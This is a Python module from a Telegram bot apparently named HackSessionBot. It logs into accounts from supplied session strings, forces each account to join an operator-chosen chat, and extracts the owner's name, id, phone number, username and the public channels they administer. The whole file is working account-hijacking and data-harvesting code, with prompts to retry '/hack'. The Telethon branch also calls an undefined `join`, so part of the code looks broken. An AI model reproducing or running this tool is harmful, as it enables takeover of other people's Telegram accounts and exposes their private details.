from pyrogram import Client
from telethon import TelegramClient
from telethon.sessions import StringSession 
from pyrogram.raw import functions 
from HackSessionBot import (
     API_ID,
     API_HASH,
     CHAT )
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest
from HackSessionBot.Helpers.data import info

async def users_gc(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            async with TelegramClient(StringSession(session),API_ID,API_HASH) as steve:
                try:
                    await steve(join(CHAT))
                except Exception as e:
                    print(e)
                k = await steve(GetAdminedPublicChannelsRequest())            
                for x in k.chats:                
                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
                            
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                k = await stark.invoke(functions.channels.GetAdminedPublicChannels())            
                for x in k.chats:
                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
    except Exception as idk:
        err += str(idk)                                             
    if err:
        return "ᴇʀʀᴏʀ\n" + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg
 
async def user_info(session):
    err = ""
    try:
        if session.endswith("="):
            async with TelegramClient(StringSession(session),API_ID,API_HASH) as steve:
                try:
                    await steve(join(CHAT))
                except Exception as e:
                    print(e)
                k = await steve.get_me()  
                msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
                             
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                k = await stark.get_me()
                msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "ᴇʀʀᴏʀ\n" + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg    
      
